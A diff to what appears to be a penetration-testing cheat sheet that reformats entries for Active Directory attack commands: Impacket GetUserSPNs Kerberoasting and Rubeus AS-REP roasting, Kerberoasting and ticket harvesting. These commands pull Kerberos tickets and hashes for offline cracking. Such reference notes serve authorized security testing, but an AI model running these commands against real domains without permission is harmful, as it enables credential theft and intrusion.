@@ -30,7 +30,7 @@
 ## I
 - Impacket
     - Kerberoasting
-        `sudo python3 GetUserSPNs.py <hostname>/<user>:<password> -dc-ip <IP Address> -request`
+       - `sudo python3 GetUserSPNs.py <hostname>/<user>:<password> -dc-ip <IP Address> -request`
 
 ## J
 
@@ -53,11 +53,11 @@
 ## R
 - Rubeus
     - AS-REP Roasting
-        `Rubeus.exe asreproast`
+        - `Rubeus.exe asreproast`
     - Kerberoasting
-        `Rubeus.exe kerberoast`
+        - `Rubeus.exe kerberoast`
     - Harvesting
-        `Rubeus.exe harvest /interval:30`
+        - `Rubeus.exe harvest /interval:30`
 
 ## S
 
